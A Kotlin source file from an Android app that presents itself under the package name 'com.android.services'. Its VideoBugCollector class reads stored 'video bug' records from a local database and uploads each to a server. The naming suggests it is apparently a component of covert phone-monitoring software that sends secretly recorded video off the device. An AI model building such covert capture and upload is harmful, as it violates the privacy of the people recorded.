package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.VideoBug
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class VideoBugCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncVideoBug) {
            localDatabaseSource.selectVideoBugs { videoBugs ->
                if (videoBugs.isNotEmpty()) {
                    try {
                        val gson = GsonBuilder().create()
                        val mVideoBugJSON = JSONArray(
                            gson.toJson(videoBugs, object : TypeToken<List<VideoBug>>() {}.type)
                        )
                        val fileUploader =
                            FileUploader(context, AppConstants.VIDEO_BUG_TYPE, localDatabaseSource)
                        for (i in 0 until mVideoBugJSON.length()) {
                            try {
                                fileUploader.uploadFile(mVideoBugJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.VIDEO_BUG_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        logException(e.message!!, AppConstants.VIDEO_BUG_TYPE, e)
                    }
                } else {
                    logVerbose("No videoBugs found", AppConstants.VIDEO_BUG_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.VIDEO_BUG_TYPE} Sync is Off")
        }
    }
}